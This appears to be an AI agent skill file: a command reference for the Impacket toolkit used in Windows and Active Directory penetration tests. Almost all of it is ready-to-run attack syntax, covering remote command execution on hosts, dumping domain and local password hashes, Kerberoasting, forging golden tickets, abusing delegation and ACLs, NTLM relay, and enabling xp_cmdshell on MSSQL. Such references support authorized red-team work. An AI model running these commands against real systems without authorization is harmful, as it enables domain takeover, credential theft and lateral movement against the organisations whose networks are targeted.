---
name: impacket-toolkit
description: "Impacket toolkit reference: the scripts used most in Windows/AD engagements, with the exact syntax for each. Use this skill when a specific Impacket script is needed."
---

# Impacket

## Overview

Impacket implements SMB, MSRPC, Kerberos, LDAP, and more in Python. Each script is a focused tool.

## Install

```bash
pipx install impacket
# or
git clone https://github.com/fortra/impacket && cd impacket && pip install .
```

## Remote execution

```bash
impacket-psexec domain.local/user:pass@10.0.0.5
impacket-wmiexec domain.local/user:pass@10.0.0.5
impacket-smbexec domain.local/user:pass@10.0.0.5
impacket-atexec domain.local/user:pass@10.0.0.5 "whoami"
impacket-dcomexec domain.local/user:pass@10.0.0.5
```

## Credentials

```bash
impacket-secretsdump domain.local/admin:pass@DC
impacket-secretsdump -just-dc-ntlm domain.local/admin:pass@DC
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip DC
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC -request
```

## Kerberos

```bash
impacket-getTGT domain.local/user:pass
impacket-getST -spn cifs/host domain.local/user:pass
impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-... -domain domain.local administrator
```

## SMB / shares

```bash
impacket-smbclient domain.local/user:pass@host
impacket-smbexec ...
smbclient.py domain.local/user:pass@host
```

## LDAP / AD

```bash
impacket-GetADUsers domain.local/user:pass -all
impacket-addcomputer domain.local/user:pass -computer-name 'EVIL$' -computer-pass 'P@ss123'
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write domain.local/user:pass
impacket-dacledit -action write -rights FullControl -principal user -target TARGET domain.local/user:pass
impacket-owneredit -action write -new-owner user -target TARGET domain.local/user:pass
```

## Relay

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -t ldaps://DC -smb2support --delegate-access
```

## MSSQL

```bash
impacket-mssqlclient domain.local/user:pass@host -windows-auth
# then: enable_xp_cmdshell, xp_cmdshell whoami
```

## Pitfalls

- Hashes need the `:nthash` form (leading colon).
- Kerberos needs `KRB5CCNAME` exported and a synced clock.
- `secretsdump` from a non-DC needs local admin.

## Verification

Each script's success must be confirmed by an observable action on the target.
